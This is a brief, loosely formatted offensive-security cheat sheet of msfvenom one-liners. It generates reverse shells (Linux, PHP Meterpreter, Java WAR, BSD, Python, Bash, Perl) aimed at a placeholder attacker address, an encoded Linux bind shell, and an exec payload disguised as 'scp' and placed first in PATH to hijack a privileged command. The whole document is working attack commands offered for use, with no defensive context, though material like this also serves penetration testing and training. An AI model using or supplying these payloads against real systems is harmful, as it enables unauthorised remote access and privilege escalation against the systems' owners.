# **Linux**

MAking executable payload -- export PATH=/home/bob:$PATH {change to payload directory accordingly in PATH and chmod 755 scp}  
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp  
or  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x  
  
**

### # PHP reverse shell

**

###   
msfvenom -p php/meterpreter/reverse_tcp LHOST=x.x.x.x  
  

**

### # Java WAR reverse shell

**

###   
msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Linux bind shell

**

###   
msfvenom -p linux/x86/shell_bind_tcp LPORT=4321 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai  
  

**

### # Linux FreeBSD reverse shell

**

###   
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=x.x.x.x  
  

**

### # Linux C reverse shell

**

###   
msfvenom -p linux/x86/shell_reverse_tcp LHOST=

x.x.x.x  
  
**

## Scripting Payloads

**

##   
msfvenom -p cmd/unix/reverse_python LHOST=x.x.x.x  
Python  
  
msfvenom -p cmd/unix/reverse_bash LHOST=x.x.x.x  
Bash  
  
msfvenom -p cmd/unix/reverse_perl LHOST=x.x.x.x  
Perl